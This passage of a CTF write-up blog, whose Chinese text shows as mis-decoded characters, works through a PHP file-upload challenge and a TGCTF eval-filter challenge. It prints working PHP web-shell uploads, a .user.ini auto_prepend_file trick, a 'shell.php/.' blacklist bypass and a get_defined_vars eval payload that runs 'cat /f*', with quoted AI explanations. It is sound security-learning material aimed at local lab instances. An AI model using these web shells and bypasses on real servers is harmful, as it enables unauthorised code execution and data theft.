<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UPLOAD_PATH&#x27;</span>, <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/uploads/&#x27;</span>);<br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$status_code</span> = <span class="hljs-number">200</span>; <span class="hljs-comment">// é»˜è®¤çŠ¶æ€ç ä¸º 200</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;php2&quot;</span>, <span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;htm&quot;</span>, <span class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jspx&quot;</span>, <span class="hljs-string">&quot;jsw&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jspf&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>, <span class="hljs-string">&quot;asp&quot;</span>, <span class="hljs-string">&quot;aspx&quot;</span>, <span class="hljs-string">&quot;asa&quot;</span>, <span class="hljs-string">&quot;asax&quot;</span>, <span class="hljs-string">&quot;ascx&quot;</span>, <span class="hljs-string">&quot;ashx&quot;</span>, <span class="hljs-string">&quot;asmx&quot;</span>, <span class="hljs-string">&quot;cer&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_name</span>, PATHINFO_EXTENSION);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$temp_file</span>);<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?&lt;/s&#x27;</span>, <span class="hljs-variable">$file_content</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ–‡ä»¶å†…å®¹åŒ…å«éæ³•å­—ç¬¦ï¼Œç¦æ­¢ä¸Šä¼ ï¼&#x27;</span>;<br>                <span class="hljs-variable">$status_code</span> = <span class="hljs-number">403</span>; <span class="hljs-comment">// 403 è¡¨ç¤ºç¦æ­¢è®¿é—®</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-variable">$file_name</span>;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                    <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&#x27;</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>                    <span class="hljs-variable">$status_code</span> = <span class="hljs-number">500</span>; <span class="hljs-comment">// 500 è¡¨ç¤ºæœåŠ¡å™¨å†…éƒ¨é”™è¯¯</span><br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;</span>;<br>            <span class="hljs-variable">$status_code</span> = <span class="hljs-number">403</span>; <span class="hljs-comment">// 403 è¡¨ç¤ºç¦æ­¢è®¿é—®</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>        <span class="hljs-variable">$status_code</span> = <span class="hljs-number">404</span>; <span class="hljs-comment">// 404 è¡¨ç¤ºèµ„æºæœªæ‰¾åˆ°</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// è®¾ç½® HTTP çŠ¶æ€ç </span><br><span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-variable">$status_code</span>);<br><br><span class="hljs-comment">// è¾“å‡ºç»“æœ</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<br>    <span class="hljs-string">&#x27;status_code&#x27;</span> =&gt; <span class="hljs-variable">$status_code</span>,<br>    <span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-variable">$msg</span>,<br>]);<br></code></pre></td></tr></table></figure>
<p>ç»æµ‹è¯•ï¼Œuploads&#x2F;index.php<br>å›æ˜¾ï¼š<br>File not found.  </p>
<p>å¹¶æ²¡æœ‰404<br>é‚£åº”è¯¥å°±èƒ½ç”¨.user.iniçš„åŠæ³•  </p>
<p>ä¸Šä¼   </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:62381<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>331<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:62381<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryMjahAHXakvDQQiYS<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:62381/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryMjahAHXakvDQQiYS</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;name&quot;; filename=&quot;shell.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryMjahAHXakvDQQiYS</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">ä¸Šä¼ æ–‡ä»¶</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryMjahAHXakvDQQiYS--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure>
<p>å›æ˜¾ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>nginx<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Thu, 08 May 2025 09:24:17 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=UTF-8<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/7.3.26<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>70<br><br><span class="language-nix">&#123;<span class="hljs-string">&quot;status_code&quot;</span>:<span class="hljs-number">200</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-char escape_">\u</span>6587<span class="hljs-char escape_">\u</span>4ef6<span class="hljs-char escape_">\u</span>4e0a<span class="hljs-char escape_">\u</span>4f20<span class="hljs-char escape_">\u</span>6210<span class="hljs-char escape_">\u</span>529f<span class="hljs-char escape_">\u</span>ff01&quot;</span>&#125;</span><br></code></pre></td></tr></table></figure>
<p>è§£ç åçš„æ„æ€å°±æ˜¯æˆåŠŸ<br>æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼<br>è®¿é—®<br>&#x2F;uploads&#x2F;shell.jpg<br>è®¿é—®æˆåŠŸï¼  </p>
<p>ç„¶åæ¥ä¸‹æ¥ä¼ .user.ini</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span> = shell.jpg<br></code></pre></td></tr></table></figure>
<p>ä¸Šä¼ æˆåŠŸ<br>æ¥ä¸‹æ¥ç”¨èš‚èšè¿<br>&#x2F;uploads&#x2F;index.php<br>å¤±è´¥ï¼Ÿ  </p>
<p>ä¸å¯¹ï¼Œç«Ÿç„¶ä¸ç”¨  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script&gt;åŒ…è£¹ï¼Œé‚£åº”è¯¥ä¹Ÿä¸ç”¨&lt;script&gt;å¤´äº†<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[shell]);<br></code></pre></td></tr></table></figure>
<p>ä¹Ÿä¸è¡Œï¼Œ<br>å®åœ¨æ²¡åŠæ³•äº†ï¼Œå»çœ‹wpï¼Œ<br>è¯´æ˜¯åœ¨æºç é‡ŒçŸ¥é“èƒ½ç”¨nameå‚æ•°æ¥è¿›è¡Œç›®å½•ç©¿è¶Šï¼Ÿ  </p>
<p>ç›´æ¥ä¼   </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php?name=shell.php/.</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:50404<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>323<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:50404<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryDxKYmUwl8LfJkYfi<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:50404/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-php">------WebKitFormBoundaryDxKYmUwl8LfJkYfi</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;name&quot;</span>; filename=<span class="hljs-string">&quot;hello.jpg&quot;</span></span><br><span class="language-php">Content-Type: image/jpg</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><br><span class="language-php"></span><br><span class="language-php"></span><br><span class="language-php"></span><br><span class="language-php">------WebKitFormBoundaryDxKYmUwl8LfJkYfi</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span></span><br><span class="language-php"></span><br><span class="language-php">ä¸Šä¼ æ–‡ä»¶</span><br><span class="language-php">------WebKitFormBoundaryDxKYmUwl8LfJkYfi--</span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure>

<p>å°½ç„¶å°±æˆåŠŸä¼ è¿›å»äº†ï¼Ÿ<br>è¿™ä¸ªæ˜¯ä»€ä¹ˆæ„é€ æ³•ï¼Ÿä»€ä¹ˆåŸç†ï¼Ÿ<br>&#x2F;upload.php?name&#x3D;hello.php&#x2F;.   </p>
<p>ç„¶åèš‚èšç›´æ¥è¿<br>&#x2F;uploads&#x2F;shell.php<br>ç„¶åç”¨èš‚èšçš„ç»ˆç«¯çœ‹ç¯å¢ƒ<br>env<br>çœ‹åˆ°flag</p>
<p>åŸç†æ˜¯å•¥ï¼Œæ€ä¹ˆç»•è¿‡çš„ï¼Ÿ</p>
<p>deepseek:  </p>
<blockquote>
<p>æ¼æ´ç‚¹ï¼šå½“æ”»å‡»è€…é€šè¿‡GETå‚æ•°name&#x3D;shell.php&#x2F;.ä¼ é€’æ–‡ä»¶åæ—¶ï¼Œpathinfo()è§£ææ‰©å±•åçš„è¡Œä¸ºå¼‚å¸¸ã€‚<br>pathinfo(â€˜shell.php&#x2F;.â€™, PATHINFO_EXTENSION)ä¼šè¿”å›ç©ºå€¼ï¼Œå› ä¸ºæœ«å°¾çš„&#x2F;.è¢«è¯†åˆ«ä¸ºç›®å½•ç»“æ„è€Œéæ–‡ä»¶æ‰©å±•åã€‚<br>é»‘åå•æ£€æŸ¥$deny_extå› æ­¤è¯¯åˆ¤æ–‡ä»¶ç±»å‹åˆæ³•ï¼Œç»•è¿‡é˜²æŠ¤ã€‚  </p>
</blockquote>
<p>åæ­£æˆ‘åœ¨kalié‡Œ<br>echo 114514 &gt; sunxiaochuan258.txt&#x2F;.æ˜¯æ— æ³•æ‰§è¡Œçš„  </p>
<p>é‚£å¯èƒ½å°±æ˜¯è¯¯åˆ¤æ–‡ä»¶ç±»å‹äº†</p>
<p>å½“ç„¶ï¼Œåˆšæ‰æ˜¯çƒ§ä¸€ç‚¹çš„åšæ³•ï¼Œæ­£å¸¸çš„åšæ³•æ˜¯<br>åˆ©ç”¨nameå‚æ•°æ¥è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œç„¶ååœ¨index.phpä¸»ç›®å½•ä¸‹ä¸Šä¼ shell.jpgå’Œ.user.ini</p>
<p>è¿™é¢˜ä¹Ÿæ˜¯å­¦åˆ°ä¸å°‘</p>
<h1 id="TGCTF-AAAå·æ¸¡é˜´å¹³"><a href="#TGCTF-AAAå·æ¸¡é˜´å¹³" class="headerlink" title="TGCTF AAAå·æ¸¡é˜´å¹³"></a>TGCTF AAAå·æ¸¡é˜´å¹³</h1><p>æ®è¯´æ˜¯webç­¾åˆ°<br>å¼€é¢˜æ‹¿åˆ°æºç   </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-variable">$tgctf2025</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tgctf2025&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$tgctf2025</span>))&#123;<br>    <span class="hljs-comment">//hintï¼šä½ å¯ä»¥å¯¹ç€é”®ç›˜ä¸€ä¸ªä¸€ä¸ªçœ‹ï¼Œç„¶ååœ¨æ²¡è¿‡æ»¤çš„ç¬¦å·ä¸Šç”¨è®°å·ç¬”ç”»ä¸€ä¸‹ï¼ˆbushi</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$tgctf2025</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢*ï½â—&#x27;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure>

<p>?tgctf2025&#x3D;system(ls);<br>&#x2F;&#x2F;Warning: Use of undefined constant ls - assumed â€˜lsâ€™ (this will throw an Error in a future version of PHP) in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php(8) : eval()â€™d code on line 1<br>index.php</p>
<p>çœ‹wpå¾—åˆ°payload<br>?tgctf2025&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;system(â€˜cat &#x2F;f*â€™);<br>ä¸æ˜ç™½<br>é—®é—®ai  </p>
<h2 id="kimi"><a href="#kimi" class="headerlink" title="kimi:  "></a>kimi:  </h2><p>è¯¥ PHP è„šæœ¬å­˜åœ¨ä»£ç æ³¨å…¥æ¼æ´ï¼Œä»¥ä¸‹æ˜¯å¯¹ payload çš„è§£é‡Šï¼š  </p>
<p>?tgctf2025&#x3D;eval(end(current(get_defined_vars()))); ï¼š  </p>
<p>get_defined_vars() è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡çš„æ•°ç»„ï¼ŒåŒ…æ‹¬å…¨å±€å˜é‡å’Œå±€éƒ¨å˜é‡ã€‚  </p>
<p>current() å‡½æ•°å–å¾—æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼Œè¿™é‡Œä¼šå¾—åˆ°æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œé€šå¸¸æ˜¯ GLOBALS æ•°ç»„ã€‚  </p>
<p>end() å‡½æ•°å°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æœ€åä¸€æ¡è®°å½•å¹¶è¿”å›è¯¥è®°å½•ï¼Œæ­¤å¤„ä½œç”¨äº current(get_defined_vars()) çš„è¿”å›å€¼ï¼Œå³ GLOBALS æ•°ç»„ï¼Œæ‰€ä»¥ä¼šæŒ‡å‘ GLOBALS æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ ã€‚    </p>
<p>ä½†åœ¨è¿™æ®µä»£ç ä¸­ï¼Œç”±äº get_defined_vars() è¿”å›çš„æ˜¯æ‰€æœ‰å˜é‡æ•°ç»„ï¼Œè€Œæˆ‘ä»¬æ˜¯å…ˆç”¨ current() å–ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå³ GLOBALS æ•°ç»„ï¼‰ï¼Œå†ç”¨ end() å°†å…¶æŒ‡é’ˆç§»åˆ°æœ€åä¸€ä¸ªå…ƒç´ ï¼Œä½†è¿™å¯¹äºç»•è¿‡æ­£åˆ™è¿‡æ»¤å’Œæ‰§è¡Œå‘½ä»¤æ¥è¯´ï¼Œå¹¶éå…³é”®ï¼ŒçœŸæ­£å…³é”®çš„æ˜¯åç»­å¦‚ä½•åˆ©ç”¨ b å‚æ•°æ¥å®ç°å‘½ä»¤æ‰§è¡Œã€‚    </p>
<p>eval() å‡½æ•°ä¼šå¯¹ä¼ å…¥çš„å­—ç¬¦ä¸²ä½œä¸º PHP ä»£ç è¿›è¡Œè§£æå’Œæ‰§è¡Œï¼Œå°† end(current(get_defined_vars())) çš„ç»“æœä¼ é€’ç»™ evalï¼Œä½†æ­¤å¤„å…³é”®ä¸åœ¨äºè¿™ä¸ª eval çš„å†…å®¹ï¼Œè€Œåœ¨äºåé¢çš„å‚æ•°æ˜¯å¦‚ä½•è¢«åˆ©ç”¨çš„ã€‚  </p>
<p>&amp;b&#x3D;system(â€˜cat &#x2F;f*â€™); ï¼š  </p>
<p>è¿™é‡Œé€šè¿‡ GET è¯·æ±‚ä¼ é€’äº†ä¸€ä¸ª b å‚æ•°ï¼Œå…¶å€¼ä¸º system(â€˜cat &#x2F;f*â€™);ã€‚  </p>
<p>åœ¨ PHP ä¸­ï¼Œsystem() å‡½æ•°ç”¨äºæ‰§è¡Œå¤–éƒ¨ç¨‹åºï¼Œå¹¶ä¸”ä¼šè¾“å‡ºç»“æœã€‚  </p>
<p>â€˜cat &#x2F;f*â€™ æ˜¯ä¸€ä¸ª Linux ç³»ç»Ÿå‘½ä»¤ï¼Œcat ç”¨äºè¾“å‡ºæ–‡ä»¶å†…å®¹ï¼Œ&#x2F;f* æ˜¯åŒ¹é…ä»¥ &#x2F;f å¼€å¤´çš„æ‰€æœ‰æ–‡ä»¶ï¼Œé€šå¸¸åœ¨ä¸€äº› CTFï¼ˆCapture The Flagï¼‰é¢˜ç›®ä¸­ï¼Œå¯èƒ½å­˜åœ¨ &#x2F;flag.txt æˆ–ç±»ä¼¼è·¯å¾„çš„æ–‡ä»¶å­˜æ”¾ç€æ ‡å¿—ï¼ˆflagï¼‰ï¼Œæ‰€ä»¥è¿™ä¸ªå‘½ä»¤æ„å›¾è¯»å–è¿™æ ·çš„æ–‡ä»¶å†…å®¹ã€‚  </p>
